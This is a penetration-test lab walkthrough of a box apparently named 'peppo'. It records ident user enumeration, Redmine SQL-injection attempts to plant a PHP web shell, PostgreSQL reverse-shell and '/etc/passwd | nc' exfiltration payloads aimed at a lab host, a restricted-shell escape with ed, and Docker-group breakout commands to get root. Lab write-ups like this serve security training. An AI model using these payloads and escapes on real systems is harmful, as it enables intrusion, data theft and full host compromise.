### Ident-user-enum
```bash
❯ apt-cache show ident-user-enum
Package: ident-user-enum
Version: 1.0-0kali2
Architecture: all
Maintainer: Kali Developers <devel@kali.org>
Installed-Size: 12
Depends: perl, libnet-ident-perl, libio-socket-ip-perl
Homepage: http://pentestmonkey.net/tools/user-enumeration/ident-user-enum
Priority: optional
Section: utils
Filename: pool/main/i/ident-user-enum/ident-user-enum_1.0-0kali2_all.deb
Size: 2836
SHA256: 139d6dd478f2d1b31fa333a4d6c689930076b3d6b085c6d8075c9f3245cf9eeb
SHA1: 9f5c962d823e173728dad160a055f212683a3cc0
MD5sum: 91a1a052fa0ecd5b34e76b491847266d
Description: Query ident to determine the owner of a TCP network process
 This package is a simple PERL script to query the ident service (113/TCP)
 in order to determine the owner of the process listening on each TCP port of
 a target system.
 .
 This can help to prioritise target service during a pentest (you might want
 to attack services running as root first).
 Alternatively, the list of usernames gathered can be used for password
 guessing attacks on other network services.
Description-md5: e01d88837682206cf3cd3e4d210eee60
```

```bash
ident-user-enum $IP 22 113 5432 8080 10000
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.200.60:22       root
192.168.200.60:113      nobody
192.168.200.60:5432     <unknown>
192.168.200.60:8080     <unknown>
192.168.200.60:10000    eleanor
```

### nmap
`sudo nmap -sV -sS -sC -A $IP -p22,113,5432,8080,10000`

8080: admin/admin

### Redmine RCE (rabbit hole)
https://github.com/RealLinkers/CVE-2019-18890

```bash
❯ python3 exploit.py http://192.168.200.60:8080 admin 12345678 "SLEEP(10)"
(+) Injection succesful!
```

```bash
python3 exploit.py http://192.168.200.60:8080 admin 12345678 "select \"<?php SYSTEM(\$_REQUEST['cmd']); ?>\" into outfile '/var/www/html/alvin1.php'"

python3 exploit.py http://192.168.200.60:8080 admin 12345678 "select \"<?php SYSTEM(\$_REQUEST['cmd']); ?>\" into outfile '/var/www/redmine/alvin1.php'"

python3 exploit.py http://192.168.200.60:8080 admin 12345678 "select \"<?php SYSTEM(\$_REQUEST['cmd']); ?>\" into outfile '/var/www/redmine/public/alvin1.php'"

python3 exploit.py http://192.168.200.60:8080 admin 12345678 "select \"<?php SYSTEM(\$_REQUEST['cmd']); ?>\" into outfile '/var/www/html/redmine/alvin1.php'"
```

### Okay, let's do the PostgreSQL injection properly then (rabbit hole)
```
python3 exploit.py http://192.168.200.60:8080 admin 12345678 "select 1 from pg_sleep(5)"
python3 exploit.py http://192.168.200.60:8080 admin 12345678 "select 1 from pg_sleep\(5\)"
```

`COPY (SELECT 'sh -i >& /dev/tcp/192.168.49.200/10000 0>&1') TO '/tmp/pentestlab';`

```sql
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'ping 192.168.49.200';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```

```sql
CREATE TABLE pentestlab (t TEXT);
INSERT INTO pentestlab(t) VALUES('sh -i >& /dev/tcp/192.168.49.200/10000 0>&1');
SELECT * FROM pentestlab;
COPY pentestlab(t) TO '/tmp/pentestlab';
```

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc 192.168.49.200 10000');
```

Okay, seems fine now after I created a subproject
```bash
❯ python3 exploit.py http://192.168.200.60:8080 admin 12345678 "SLEEP(5)"
(+) ProjectId 1 with a subproject was found succesfuly!
(+) Injection succesful!
<Response [200]>
```

### 10000 (rabbit hole)
```bash
feroxbuster -u http://192.168.200.60:10000 -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e
```

### Foothold
After wasting hours on Redmine, I realized the I got the SSH creds from very beginning `192.168.200.60:10000    eleanor`
```bash
ssh eleanor@$IP 
```

failed on bypass strict
```
❯ ssh eleanor@$IP -t bash
eleanor@192.168.200.60's password: 
rbash: bash: command not found
Connection to 192.168.200.60 closed.
                                                                                                                                                                                            
❯ ssh eleanor@$IP -t sh
eleanor@192.168.200.60's password: 
rbash: sh: command not found
Connection to 192.168.200.60 closed.
                                                                                                                                                                                            
❯ ssh eleanor@$IP -t zsh
eleanor@192.168.200.60's password: 
rbash: zsh: command not found
Connection to 192.168.200.60 closed.
```

Checking command availability
```
eleanor@peppo:~$ echo $PATH
/home/eleanor/bin

eleanor@peppo:~$ ls bin
chmod  chown  ed  ls  mv  ping  sleep  touch
```

https://gtfobins.github.io/gtfobins/ed/

`ed` It can be used to break out from restricted environments by spawning an interactive system shell.

```bash
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

### Root with Docker escape Shell

It can be used to break out from restricted environments by spawning an interactive system shell.
The resulting is a root shell.

```bash
id -> 999 docker
GTFObins -> shell
docker image ls -> list available images
docker run -v /:/mnt --rm -it postgres chroot /mnt sh
```

### Let's check linpeas
```
wget http://192.168.49.200:10000/linpeah.sh
```

```bash
OS: Linux version 4.9.0-12-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.210-1 (2020-01-20)
User & Groups: uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
```

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounted-docker-socket-escape

```
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```

### Summary
The initial shell got with exposed creds. Then `Docker escape` to get root.